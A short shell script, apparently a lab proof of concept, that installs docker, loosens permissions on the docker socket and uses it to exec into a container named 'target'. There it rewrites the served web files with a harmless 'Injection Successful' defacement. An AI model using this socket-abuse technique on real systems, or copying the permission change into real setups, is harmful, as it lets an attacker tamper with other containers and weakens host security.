#!/bin/sh

apk update && apk upgrade
apk add --no-cache docker sudo
addgroup root docker
chmod -R 774 /var/run/docker.sock
sudo docker exec target sh -c "
   sed -i 's/Hullo Wurld/Injection Successful/g' /koa/client/public/index.js &&
   sed -i 's/Index/Injected/g' /koa/client/public/index.html &&
   echo 'document.getElementById(\"app\").style.color = \"red\";' >> /koa/client/public/index.js
"
echo "Target container has been injected"
